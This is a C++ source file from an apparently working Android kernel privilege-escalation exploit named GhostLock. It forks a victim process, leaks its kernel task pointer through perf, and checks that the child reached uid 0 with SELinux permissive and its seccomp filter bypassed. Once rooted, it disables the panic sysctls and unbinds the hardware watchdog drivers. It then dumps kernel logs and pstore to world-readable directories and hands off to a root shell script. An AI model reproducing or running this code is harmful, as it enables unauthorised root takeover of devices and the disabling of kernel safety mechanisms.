/*
 * GhostLock — victim process protocol: spawn, command pipe loop, root handoff.
 *
 * Split out of main.cpp; the statement order and log text are unchanged.
 */

#include "session/victim_process.hpp"

#include "attack/ops.hpp"
#include "support/native_resource.hpp"

#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#include <array>
#include <cstring>
#include <ctime>
#include <dirent.h>

namespace ghostlock::session::victim {
    /* rooted exits kfree the static init_cred (w2 stores it with no
 * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
    static void park_child_process_forever(void) {
        support::UniqueFd adj(open("/proc/self/oom_score_adj", O_WRONLY | O_CLOEXEC));
        if (adj.valid()) {
            const char value[] = "-1000";
            (void) write(adj.get(), value, sizeof(value) - 1);
        }
        for (;;) pause();
    }

    /* Rooted child zeroes the panic-trigger sysctls: after the first rooted
     * round, a missed round in the same boot degrades to a logged oops instead
     * of a reboot. uid=0 + init_cred passes the root-owned sysctl mode check;
     * W1 already left SELinux permissive; the app seccomp filter restricts
     * syscall numbers, not paths -- openat/write on /proc are already proven
     * by oom_score_adj. Failures are logged, non-fatal. */
    static void suppress_panic_reboot(void) {
        static const char *const kPanicSysctls[] = {
                "/proc/sys/kernel/panic_on_oops",
                "/proc/sys/kernel/panic_on_rcu_stall",
        };
        for (const char *path : kPanicSysctls) {
            support::UniqueFd fd(open(path, O_WRONLY | O_CLOEXEC));
            if (!fd.valid()) {
                pr_warning("panic-suppress open failed path=%s errno=%d\n", path, errno);
                continue;
            }
            errno = 0;
            static const char kZero[] = "0";
            const ssize_t nw = write(fd.get(), kZero, sizeof(kZero) - 1);
            if (nw != 1) {
                pr_warning("panic-suppress write failed path=%s errno=%d\n", path, errno);
                continue;
            }
            /* Read back: one silent non-stick write already happened (the
             * fork-hold holder's oom_score_adj), so log the effective value. */
            support::UniqueFd rd(open(path, O_RDONLY | O_CLOEXEC));
            char value[8] = {};
            const ssize_t nr = rd.valid() ? read(rd.get(), value, sizeof(value) - 1) : -1;
            if (nr > 0) {
                size_t vlen = static_cast < size_t > (nr);
                while (vlen > 0 && value[vlen - 1] == '\n') vlen--;
                value[vlen] = '\0';
                pr_info("panic-suppress ok path=%s value=%s\n", path, value);
            } else {
                pr_info("panic-suppress ok path=%s (readback failed errno=%d)\n", path, errno);
            }
        }
    }

    /* Write a short NUL-free string to a sysfs attribute; returns bytes or -1. */
    static ssize_t write_name_to(const char *path, const char *name) {
        support::UniqueFd fd(open(path, O_WRONLY | O_CLOEXEC));
        if (!fd.valid()) return -1;
        return write(fd.get(), name, strlen(name));
    }

    /* Rooted child disarms the marble vendor reboot chain without
     * delete_module: the miss round dies through qcom_soc_wdt (20s bark ->
     * bite) + gh_virt_wdt, never through panic() (PANIC_TIMEOUT=-1, pstore
     * stays empty, bootreason=reboot). The direct rmmod proved deadly on
     * device (k round-23): the rooted child itself is a descendant of
     * app zygote -> holds module refcounts via MM, so delete_module went to
     * sleep in the kernel waiting for our OWN refcount to drop and the
     * child hung forever in D state (no wdt-off line, no root worker
     * spawn). Instead stop the petting thread: qcom_soc_wdt registers a
     * platform driver whose probe owns the msm-watchdog; unbinding it
     * (echo > driver unbind) runs qcom_wdt_remove through the driver core
     * in the caller's context -- no refcount wait, no sleep on ourselves.
     * uid=0 + init_cred passes the write permission check; W1 already left
     * SELinux permissive. Failures are logged, non-fatal. */
    static void disable_watchdog_modules(void) {
        static const char *const kWatchdogBindPaths[] = {
                /* gh-watchdog driver dir holds a live symlinked device
                 * (hypervisor:qcom,gh-watchdog, verified on device); unbind
                 * runs the driver remove path in the caller's context. */
                "/sys/bus/platform/drivers/gh-watchdog/unbind",
                /* msm_watchdog driver dir exists but had NO bound device on
                 * device (soc wdt binds via qcom_soc_wdt.ko with its own
                 * device name); kept as best-effort second path. */
                "/sys/bus/platform/drivers/msm_watchdog/unbind",
        };
        for (const char *path : kWatchdogBindPaths) {
            errno = 0;
            const ssize_t nw = write_name_to(path, "hypervisor:qcom,gh-watchdog");
            if (nw < 0) {
                pr_info("wdt-off unbind miss path=%s errno=%d\n", path, errno);
                continue;
            }
            pr_info("wdt-off unbind ok path=%s\n", path);
            return;
        }
    }

    /* Evidence directory. The app files dir is the natural home, but anything
     * written there by this uid=0 task is root:root 0600, which adb shell and
     * run-as both read as EACCES - one hit's 256 KiB kmsg snapshot was already
     * lost that way. /data/local/tmp survives reboots, and a 0777 subdir under
     * its 0771 shell:shell parent stays readable for adb shell long after the
     * app process is gone, so the record is always pullable. */
    static const char *const kForensicsDir = "/data/local/tmp/glkfx";

    static bool forensics_dir(char *buf, size_t n) {
        snprintf(buf, n, "%s", kForensicsDir);
        const int made = mkdir(buf, 0777);
        /* Snapshot mkdir's errno before chmod runs: chmod is a real syscall and
         * overwrites errno on failure, which would otherwise turn a genuine
         * failure into a bogus EEXIST match. */
        const int made_errno = (made == 0) ? 0 : errno;
        /* The inherited umask strips the group/other bits, which leaves the
         * directory unsearchable for adb shell (EACCES on every path inside,
         * even for 0644 files). Force the mode: this task is uid=0 here, and a
         * 0700 evidence dir hides exactly the record we are trying to keep. */
        (void) chmod(buf, 0777);
        if (made == 0 || made_errno == EEXIST) return true;
        /* Fall back to the app files dir (the root script's dirname). */
        snprintf(buf, n, "%s", config::runtime_config_snapshot().root_script_path.c_str());
        char *slash = strrchr(buf, '/');
        if (slash == nullptr) return false;
        *slash = '\0'; /* .../files (root script lives directly in app files/) */
        return true;
    }

    static void copy_forensics_file(const char *dir, const char *src, const char *tag) {
        support::UniqueFd in(open(src, O_RDONLY | O_CLOEXEC));
        if (!in.valid()) {
            pr_warning("forensics miss src=%s errno=%d\n", src, errno);
            return;
        }
        std::array < char, 512 > dst{};
        snprintf(dst.data(), dst.size(), "%s/%s", dir, tag);
        support::UniqueFd out(
                open(dst.data(), O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644));
        if (!out.valid()) {
            pr_warning("forensics create failed dst=%s errno=%d\n", dst.data(), errno);
            return;
        }
        /* The app runs with umask 0077, which strips the group/other bits from
         * the open() mode: force the mode after the fact so adb shell (uid
         * 2000) can read the snapshot without root. */
        (void) fchmod(out.get(), 0644);
        std::array < char, 4096 > buf{};
        ssize_t total = 0;
        ssize_t nr;
        while ((nr = read(in.get(), buf.data(), buf.size())) > 0) {
            ssize_t off = 0;
            while (off < nr) {
                const ssize_t nw = write(out.get(), buf.data() + off, static_cast < size_t > (nr - off));
                if (nw <= 0) break;
                off += nw;
            }
            total += nr;
        }
        fsync(out.get()); /* the machine can die right after this returns */
        pr_info("forensics ok src=%s dst=%s bytes=%zd\n", src, dst.data(), total);
    }

    /* Head of THIS boot's printk ring (ramoops probe results, pstore/ramoops
     * registration messages, console setup) - the first 256 KiB answer "did
     * ramoops register at all". /dev/kmsg is root-only; uid=0 reads it with
     * O_NONBLOCK so the drain stops at EAGAIN instead of blocking forever. */
    static void dump_kmsg_head(const char *dir) {
        support::UniqueFd in(open("/dev/kmsg", O_RDONLY | O_NONBLOCK | O_CLOEXEC));
        if (!in.valid()) {
            pr_warning("kmsg head open failed errno=%d\n", errno);
            return;
        }
        std::array < char, 512 > dst{};
        snprintf(dst.data(), dst.size(), "%s/kmsg-head.bin", dir);
        support::UniqueFd out(
                open(dst.data(), O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644));
        if (!out.valid()) {
            pr_warning("kmsg head create failed dst=%s errno=%d\n", dst.data(), errno);
            return;
        }
        (void) fchmod(out.get(), 0644); /* umask 0077 would hide it from adb shell */
        ssize_t total = 0;
        while (total < 262144) {
            char rec[4096];
            const ssize_t nr = read(in.get(), rec, sizeof(rec));
            if (nr <= 0) break; /* EAGAIN = ring drained from the start */
            const ssize_t nw = write(out.get(), rec, static_cast < size_t > (nr));
            if (nw <= 0) break;
            total += nw;
        }
        fsync(out.get());
        pr_info("kmsg head ok dst=%s bytes=%zd\n", dst.data(), total);
    }

    /* Continuous kernel-log recorder. A miss-round death leaves no pstore
     * entry (ramoops never registers on this device), so the kernel's own
     * account of the wedge exists only in the printk ring of the boot that
     * dies. This detached fork keeps draining /dev/kmsg into a world-readable
     * file and fsyncs every batch it writes, so the record survives both the
     * wedge and the power cycle that follows it. */
    static void start_kmsg_tailer(const char *dir) {
        const pid_t tail = fork();
        if (tail < 0) {
            pr_warning("kmsg tail: fork failed errno=%d\n", errno);
            return;
        }
        if (tail > 0) {
            pr_info("kmsg tail: recorder pid=%d\n", tail);
            return;
        }
        setsid();
        /* Do NOT inherit the run's descriptors: the reclaim sockets and the
         * handoff pipes must stay owned by the exiting parent, not by a
         * long-lived child. */
        int32_t fd_limit = 1024;
        struct rlimit nofile_limit{};
        if (getrlimit(RLIMIT_NOFILE, &nofile_limit) == 0 &&
            nofile_limit.rlim_cur != RLIM_INFINITY &&
            nofile_limit.rlim_cur <= static_cast<rlim_t>(1048576)) {
            fd_limit = static_cast<int32_t>(nofile_limit.rlim_cur);
        }
#if defined(__NR_close_range)
        /* One syscall instead of up to a million: the sweep runs before the
         * header is written, and the loop measurably delayed the first durable
         * byte on a loaded device. */
        const bool swept = syscall(__NR_close_range, 3U, ~0U, 0U) == 0;
#else
        const bool swept = false;
#endif
        if (!swept) {
            for (int32_t fd = 3; fd < fd_limit; fd++) close(fd);
        }
        std::array < char, 512 > path{};
        snprintf(path.data(), path.size(), "%s/kmsg-tail.bin", dir);
        support::UniqueFd in(open("/dev/kmsg", O_RDONLY | O_CLOEXEC));
        support::UniqueFd out(
                open(path.data(), O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644));
        if (!in.valid() || !out.valid()) _exit(1);
        (void) fchmod(out.get(), 0644); /* umask 0077 would hide the tail from adb shell */
        std::array < char, 128 > hdr{};
        const int hn =
                snprintf(hdr.data(), hdr.size(), "\n=== glk kmsg tail start pid=%d ===\n", getpid());
        if (hn > 0) {
            const ssize_t nw = write(out.get(), hdr.data(), static_cast < size_t > (hn));
            (void) nw;
            fsync(out.get());
        }
        /* lmkd must not reap the recorder: a killed recorder is exactly the case
         * that left the previous freeze with a header and nothing after it. */
        support::UniqueFd oom(open("/proc/self/oom_score_adj", O_WRONLY | O_CLOEXEC));
        if (oom.valid()) {
            const ssize_t nw = write(oom.get(), "-1000", 5);
            (void) nw;
        }
        std::array < char, 8192 > rec{};
        for (;;) {
            const ssize_t nr = read(in.get(), rec.data(), rec.size());
            if (nr > 0) {
                ssize_t off = 0;
                while (off < nr) {
                    const ssize_t nw = write(out.get(), rec.data() + off,
                                             static_cast < size_t > (nr - off));
                    if (nw <= 0) break;
                    off += nw;
                }
                /* Every batch, not every second. The wedge this recorder exists
                 * to explain takes the machine down inside that window, and the
                 * power cycle that follows discards whatever is still dirty. */
                fsync(out.get());
            } else if (nr < 0 && errno != EAGAIN && errno != EINTR) {
                /* Never give up on the first bad read: the oops text this
                 * recorder is chasing is printed at the instant the wedge
                 * begins, and /dev/kmsg usually stays readable through it. */
                fsync(out.get());
                usleep(1000);
            }
        }
    }

    /* One-shot calibration experiment: shell never sees a pstore entry after
     * a real miss-round death, yet the DT carries a ramoops reservation. Fire
     * a deliberate SysRq 'c' panic 40 s after the first rooted task of this
     * boot, from a detached fork. If ramoops is registered, the next boot then
     * has console-ramoops-0 with "sysrq triggered crash" at the tail - which
     * proves the channel and gives the reference shape. If it is still empty,
     * this device's ramoops never registers and pstore is a dead end. The
     * marker file makes it one-shot per install (app data survives reboots);
     * delete files/.pstore-calib-done via run-as to re-arm. */
    static void arm_pstore_calibration_probe(const char *dir) {
        /* Opt-in only. This probe deliberately panics the kernel 40 s after a
         * hit, which once invalidated a hit round's own verification (m/round-11:
         * the "wdt-off unbind ok" line was there, then the device went away
         * before the poll finished). Create <dir>/.pstore-calib-enable via
         * run-as to arm it. */
        std::array < char, 512 > enable{};
        snprintf(enable.data(), enable.size(), "%s/.pstore-calib-enable", dir);
        if (access(enable.data(), F_OK) != 0) return;
        std::array < char, 512 > marker{};
        snprintf(marker.data(), marker.size(), "%s/.pstore-calib-done", dir);
        support::UniqueFd mk(
                open(marker.data(), O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600));
        if (!mk.valid()) {
            if (errno == EEXIST) pr_info("calib: marker exists, probe already armed/fired\n");
            else pr_warning("calib: marker create failed errno=%d\n", errno);
            return;
        }
        const pid_t probe = fork();
        if (probe < 0) {
            pr_warning("calib: fork failed errno=%d\n", errno);
            return;
        }
        if (probe == 0) {
            setsid();
            sleep(40);
            const char *setup[] = {"/proc/sys/kernel/panic", "10", "/proc/sys/kernel/sysrq", "1"};
            for (size_t i = 0; i < 4; i += 2) {
                support::UniqueFd fd(open(setup[i], O_WRONLY | O_CLOEXEC));
                if (fd.valid()) {
                    const ssize_t nw = write(fd.get(), setup[i + 1], strlen(setup[i + 1]));
                    (void) nw;
                }
            }
            support::UniqueFd trig(open("/proc/sysrq-trigger", O_WRONLY | O_CLOEXEC));
            if (trig.valid()) {
                const ssize_t nw = write(trig.get(), "c", 1);
                (void) nw;
            }
            _exit(0); /* unreachable when the trigger works */
        }
        pr_info("calib: probe armed pid=%d sysrq panic in 40s\n", probe);
    }

    /* Forensics: shell cannot read /sys/fs/pstore (root-only), but this task
     * is uid=0 with full caps. Copy EVERY pstore entry (not just the classic
     * ramoops names) plus kernel parameters that decide the reboot chain, so
     * a later reboot cannot lose them. */
    static void dump_pstore_snapshot(void) {
        std::array < char, 320 > files_dir{};
        if (!forensics_dir(files_dir.data(), files_dir.size())) return;

        /* An earlier build put the recorder in /data/local/tmp/glk-forensics and
         * created it under a umask that left it 0700 root:root, so a whole
         * boot's kernel record was unreachable for adb shell. This task is uid=0
         * and can still repair it: widen the old directory and its recorder so
         * the boot that died can be read after the next reset. */
        (void) chmod("/data/local/tmp/glk-forensics", 0777);
        (void) chmod("/data/local/tmp/glk-forensics/kmsg-tail.bin", 0644);
        (void) chmod("/data/local/tmp/glk-forensics/kmsg-head.bin", 0644);

        static const char *const kParamFiles[] = {
                "/proc/version",
                "/proc/cmdline",
                "/proc/sys/kernel/panic",
                "/proc/sys/kernel/panic_on_oops",
                "/proc/sys/kernel/panic_on_rcu_stall",
                "/proc/sys/kernel/sysrq",
                "/proc/last_kmsg",
        };
        for (const char *src : kParamFiles) {
            const char *base = strrchr(src, '/');
            base = (base == nullptr) ? src : base + 1;
            std::array < char, 96 > tag{};
            snprintf(tag.data(), tag.size(), "param-%s", base);
            copy_forensics_file(files_dir.data(), src, tag.data());
        }
        start_kmsg_tailer(files_dir.data());
        dump_kmsg_head(files_dir.data());

        DIR *dir = opendir("/sys/fs/pstore");
        if (dir == nullptr) {
            pr_warning("pstore dump: opendir failed errno=%d\n", errno);
            return;
        }
        int dumped = 0;
        const struct dirent *de;
        while ((de = readdir(dir)) != nullptr) {
            if (de->d_name[0] == '.') continue;
            std::array < char, 512 > dst{};
            snprintf(dst.data(), dst.size(), "pstore-%s", de->d_name);
            std::array < char, 512 > src{};
            snprintf(src.data(), src.size(), "/sys/fs/pstore/%s", de->d_name);
            copy_forensics_file(files_dir.data(), src.data(), dst.data());
            dumped++;
        }
        closedir(dir);
        if (dumped == 0) pr_info("pstore dump: no entries (dir empty)\n");
        arm_pstore_calibration_probe(files_dir.data());
    }

    /* The handoff's own witness. stdio is block-buffered and both execve() and
     * _exit() throw away whatever is still buffered, so a worker that dies
     * between the fork and the script's first line leaves nothing behind --
     * which is exactly how the root script's silent non-start stayed invisible.
     * Raw syscalls plus fsync, so the stage it reached survives whatever the
     * worker does next. */
    static void handoff_breadcrumb(const char *home, const char *stage, int32_t value) {
        std::array < char, 352 > path{};
        snprintf(path.data(), path.size(), "%s/.ghostlock_handoff_probe", home);
        support::UniqueFd out(open(path.data(), O_WRONLY | O_CREAT | O_APPEND, 0644));
        if (!out.valid()) return;
        (void) fchmod(out.get(), 0644);
        std::array < char, 160 > line{};
        const int32_t n = snprintf(line.data(), line.size(), "%s value=%d errno=%d\n",
                                   stage, value, errno);
        if (n > 0) {
            const ssize_t written = write(out.get(), line.data(), static_cast<size_t>(n));
            (void) written;
        }
        (void) fsync(out.get());
    }

    static void child_main(VictimContext &p) {
        p.task_read.reset();
        p.cmd_write.reset();
        p.uid_read.reset();
        setpgid(0, 0); /* own group; the parent kills the whole tree on timeout */
        fcntl(p.uid_write.get(), F_SETFD, FD_CLOEXEC); /* keep the probe pipe out of the
                                          * root shell / ksud chain */
        prctl(PR_SET_NAME, "ghostleaf_0123456789");
        uintptr_t t[3] = {attack::perf_find_task(), 0, 0};
        /* A real leak reproduces; a fluke vote winner does not. W2 writes to
         * this address, so the samples must agree: accepting any two
         * consecutive runs lets a systematic sampling bias through, which is
         * exactly the shape a truncated perf ring produces. Three votes and a
         * majority is the smallest form that rejects it. */
        t[1] = attack::perf_find_task();
        t[2] = attack::perf_find_task();
        uintptr_t my_task = 0;
        if (t[0] != 0 && (t[0] == t[1] || t[0] == t[2])) {
            my_task = t[0];
        } else if (t[1] != 0 && t[1] == t[2]) {
            my_task = t[1];
        }
        write(p.task_write.get(), &my_task, sizeof(my_task));
        p.task_write.reset();
        if (!my_task) _exit(1);
        char cmd;
        while (read(p.cmd_read.get(), &cmd, 1) == 1) {
            if (cmd == 'C') {
                uint32_t uid = getuid();
                write(p.uid_write.get(), &uid, sizeof(uid));
            } else if (cmd == 'F') {
                /* Forked finit_module probe after W3 cleared TIF_SECCOMP and
             * seccomp.mode: mode==2 re-arms TIF_SECCOMP on fork (probe hits the
             * filter); mode==0 lets it run filter-free to a normal errno. Forked
             * so SIGSYS costs only this. */
                uint32_t code = 0xffffffff;
                int32_t probe_pipe[2];
                if (pipe(probe_pipe) == 0) {
                    pid_t probe = fork();
                    if (probe == 0) {
                        close(probe_pipe[0]);
                        /* Forked probe: keep default SIGSYS so the filter kills it. */
                        signal(SIGSYS, SIG_DFL);
                        errno = 0;
                        long r = syscall(__NR_finit_module, 0, 0, 0);
                        uint32_t out = (r == 0) ? 0 : static_cast<uint32_t>errno;
                        ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
                        (void) nw;
                        _exit(0);
                    }
                    close(probe_pipe[1]);
                    int32_t st = 0;
                    if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
                        ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
                        if (nr != static_cast<ssize_t>(sizeof(code))) code = 0xfffffffe;
                    } else {
                        code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
                    }
                    close(probe_pipe[0]);
                }
                write(p.uid_write.get(), &code, sizeof(code));
            } else if (cmd == 'M') {
                /* Report comm length + first byte to tell which side a leaf=1 write
             * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
             * [target+8] len 8, untouched len 15. */
                std::array < char, 24 > comm{};
                support::UniqueFd cf(open("/proc/self/comm", O_RDONLY | O_CLOEXEC));
                if (cf.valid()) {
                    const ssize_t n = read(cf.get(), comm.data(), comm.size() - 1);
                    (void) n;
                }
                size_t len = strlen(comm.data());
                while (len > 0 && comm[len - 1] == '\n') {
                    comm[len - 1] = 0;
                    len--;
                }
                uint32_t report =
                        (static_cast<uint32_t>(len) << 8) | static_cast<uint32_t>(static_cast<unsigned char>(comm[0]));
                write(p.uid_write.get(), &report, sizeof(report));
            } else if (cmd == 'P') {
                /* w2 rooted this task; park */
                p.cmd_read.reset();
                p.uid_write.reset();
                park_child_process_forever();
            } else if (cmd == 'G' || cmd == 'X') {
                pr_info("handoff: root script path=%s\n", (config::runtime_config_snapshot().root_script_path.c_str()));
                break;
            }
        }
        p.cmd_read.reset();
        if (getuid() != 0) {
            p.uid_write.reset();
            _exit(1);
        }
        /* First rooted task of this boot: cut the reboot chain before any
         * later missed round can hit panic_on_oops, and snapshot the previous
         * boot's panic printk tail from pstore. Run once, before the fd sweep. */
        suppress_panic_reboot();
        dump_pstore_snapshot();
        /* The marble miss round reboots through the vendor watchdog chain,
         * not panic(); unload it while we hold uid=0. */
        disable_watchdog_modules();
        /* Don't leak app-side fds into the root shell chain: ksud/zygisk
     * daemons must not keep their write ends open. */
        /* Every live descriptor above stdio must not leak into the exec chain,
         * however high the soft limit goes; the old 1024 cutoff missed the
         * descriptors the spray opens past it. */
        int32_t fd_limit = 1024;
        struct rlimit nofile_limit{};
        if (getrlimit(RLIMIT_NOFILE, &nofile_limit) == 0 &&
            nofile_limit.rlim_cur != RLIM_INFINITY &&
            nofile_limit.rlim_cur <= static_cast<rlim_t>(1048576)) {
            fd_limit = static_cast<int32_t>(nofile_limit.rlim_cur);
        }
        for (int32_t fd = 3; fd < fd_limit; fd++) {
            int32_t fl = fcntl(fd, F_GETFD);
            if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
        }
        /* Pin the path in a stack buffer before fork/exec. The RuntimeConfig path
     * is now std::string-owned; passing its heap pointer straight into execl()
     * failed with EFAULT at the kernel boundary even though userspace could
     * print it, so the exec path must travel in process-stable stack storage. */
        std::array < char, 320 > script_path{};
        snprintf(script_path.data(), script_path.size(), "%s",
                 config::runtime_config_snapshot().root_script_path.c_str());
        handoff_breadcrumb(config::runtime_config_snapshot().home_dir.c_str(),
                           "handoff-pre-fork", static_cast<int32_t>(getuid()));
        pid_t worker = fork();
        if (worker == 0) {
            /* Detach into a brand-new session: the independent root shell owns the
         * whole chain (ksud late-load + module watch) and must survive the
         * exploit parent killing this group on timeout. */
            if (setsid() < 0) _exit(1);
            errno = 0;
            support::UniqueFd probe(open(script_path.data(), O_RDONLY | O_CLOEXEC));
            pr_info("handoff: script open fd=%d errno=%d path=%s\n", probe.get(), errno,
                    script_path.data());
            handoff_breadcrumb(config::runtime_config_snapshot().home_dir.c_str(),
                               "worker-enter", static_cast<int32_t>(getuid()));
            /* mksh says nothing and exits 0 when the script it was handed looks
             * empty, and a script it never managed to read looks exactly the
             * same from the outside. Record what this process can actually see,
             * and prove that a shell can run a command at all here, before the
             * handoff is allowed to depend on one. */
            const char *handoff_home = config::runtime_config_snapshot().home_dir.c_str();
            /* open() above may have failed; lseek/read on fd -1 would only add a
             * second errno to the record, so keep both at -1 in that case. */
            off_t script_size = -1;
            ssize_t script_bytes = -1;
            if (probe.get() >= 0) {
                script_size = lseek(probe.get(), 0, SEEK_END);
                (void) lseek(probe.get(), 0, SEEK_SET);
            }
            handoff_breadcrumb(handoff_home, "worker-script-size",
                               static_cast<int32_t>(script_size));
            std::array < char, 32 > script_head{};
            if (probe.get() >= 0) {
                script_bytes = read(probe.get(), script_head.data(), script_head.size());
            }
            handoff_breadcrumb(handoff_home, "worker-script-read",
                               static_cast<int32_t>(script_bytes));
            std::array < char, 384 > sh_probe{};
            snprintf(sh_probe.data(), sh_probe.size(),
                     "echo alive uid=$(id -u) >'%s/.ghostlock_sh_probe' 2>&1",
                     handoff_home);
            const pid_t sh_test = fork();
            if (sh_test == 0) {
                execl("/system/bin/sh", "sh", "-c", sh_probe.data(),
                      static_cast<char *>(nullptr));
                _exit(127);
            }
            if (sh_test > 0) {
                int32_t sh_status = -1;
                (void) waitpid(sh_test, &sh_status, 0);
                handoff_breadcrumb(handoff_home, "worker-sh-rc", sh_status);
            }
            /* -x: when the shell dies before the script's first line can create
             * its log, the trace it writes to stderr is the only account of how
             * far it got. */
            execl("/system/bin/sh", "sh", "-x", script_path.data(),
                  static_cast<char *>(nullptr));
            const int32_t exec_errno = errno;
            handoff_breadcrumb(config::runtime_config_snapshot().home_dir.c_str(),
                               "worker-exec-failed", exec_errno);
            pr_warning("execl root script failed path=%s errno=%d\n",
                       script_path.data(), exec_errno);
            _exit(1);
        }
        pr_info("handoff: root shell worker pid=%d\n", worker);
        if (worker < 0) {
            pr_warning("fork() for root shell failed errno=%d; parking rooted child\n", errno);
            p.uid_write.reset();
            park_child_process_forever();
        }
        /* the worker holds a fresh cred copy; this task holds the raw init_cred */
        p.uid_write.reset();
        park_child_process_forever();
    }

    /* Move one end of a victim pipe above the fd_set bitmap. reserve_low_fds()
     * parks /dev/null over the bitmap's numbers, but a descriptor that was
     * already open when the park ran keeps its number, and the open_selected_fds
     * dup2 pass redirects every set bit -- including the ones the waiter words
     * light through fake_task, fake_lock and the write target. */
    static int32_t raise_pipe_fd(int32_t fd) {
        const int32_t high = fcntl(fd, F_DUPFD, kernel::PSELECT_ROUTE_NFDS + 96);
        if (high < 0) {
            pr_warning("pipe fd raise failed fd=%d errno=%d\n", fd, errno);
            return -1;
        }
        close(fd);
        return high;
    }

    static pid_t spawn_child(VictimContext &p) {
        std::array<int32_t, 2> p1{}, p2{}, p3{};
        if (pipe(p1.data()) < 0 || pipe(p2.data()) < 0 || pipe(p3.data()) < 0) return -1;
        std::array<int32_t *, 6> raised = {&p1[0], &p1[1], &p2[0], &p2[1], &p3[0], &p3[1]};
        for (int32_t *fd : raised) {
            const int32_t high = raise_pipe_fd(*fd);
            if (high < 0) return -1;
            *fd = high;
        }
        p.task_read.reset(p1[0]);
        p.task_write.reset(p1[1]);
        p.cmd_read.reset(p2[0]);
        p.cmd_write.reset(p2[1]);
        p.uid_read.reset(p3[0]);
        p.uid_write.reset(p3[1]);
        pid_t child = fork();
        if (child < 0) return -1;
        if (child == 0) {
            child_main(p);
            _exit(1);
        }
        p.task_write.reset();
        p.cmd_read.reset();
        p.uid_write.reset();
        p.set_child(child);
        return child;
    }

    /* Fork the victim and read back the task pointer perf leaked. */
    std::optional<VictimSpawn> spawn_victim(VictimContext &p) {
        pid_t child = spawn_child(p);
        if (child < 0) return std::nullopt;
        uintptr_t task = 0;
        ssize_t nr = read(p.task_read.get(), &task, sizeof(task));
        p.task_read.reset();
        const uintptr_t leaked = (nr == static_cast<ssize_t>(sizeof(task)))
                                     ? task
                                     : 0;
        return VictimSpawn{child, leaked};
    }

    int32_t verify_selinux_stage(void *context) {
        (void) context;
        if (!attack::check_selinux_off()) return 0;
        pr_success("SELinux permissive\n");
        return 1;
    }

    int32_t verify_w2_stage(void *context) {
        auto *stage = static_cast<struct w2_stage_context *>(context);
        if (write(stage->pipes.cmd_write.get(), "C", 1) != 1) return 0;

        uint32_t child_uid = 9999;
        if (read(stage->pipes.uid_read.get(), &child_uid, sizeof(child_uid)) !=
            static_cast<ssize_t>(sizeof(child_uid))) {
            return 0;
        }
        pr_info("child uid = %u\n", child_uid);
        if (child_uid != 0) return 0;
        pr_success("child is root!\n");
        return 1;
    }

    int32_t verify_seccomp_probe_stage(void *context) {
        auto *stage = static_cast<struct w2_stage_context *>(context);
        if (write(stage->pipes.cmd_write.get(), "F", 1) != 1) return 0;

        uint32_t code = 0;
        if (read(stage->pipes.uid_read.get(), &code, sizeof(code)) !=
            static_cast<ssize_t>(sizeof(code))) {
            return 0;
        }
        pr_info("seccomp finit_module probe = 0x%x\n", code);
        /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
     * With init_cred + permissive SELinux a real probe fails with a normal
     * errno instead. */
        if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
            code == 1 || code == 38) {
            return 0;
        }
        pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
        return 1;
    }

    int32_t verify_leaf_dir_stage(void *context) {
        auto *stage = static_cast<struct w3_stage_context *>(context);
        if (write(stage->pipes.cmd_write.get(), "M", 1) != 1) return 0;

        uint32_t report = 0;
        if (read(stage->pipes.uid_read.get(), &report, sizeof(report)) !=
            static_cast<ssize_t>(sizeof(report))) {
            return 0;
        }
        size_t len = (report >> 8) & 0xff;
        unsigned char c0 = static_cast<unsigned char>(report & 0xff);
        pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned) len, c0);
        if (len == 8) {
            stage->leaf_to_target8 = 1;
            pr_info("leaf=1 write lands on [target+8]\n");
            return 1;
        }
        if (len == 0) {
            stage->leaf_to_target8 = 0;
            pr_info("leaf=1 write lands on [target]\n");
            return 1;
        }
        if (len == 15) {
            pr_warning("leaf dir probe: comm untouched (write missed the comm field)\n");
            return 0;
        }
        pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned) len, c0);
        return 0;
    }
} // namespace ghostlock::session::victim
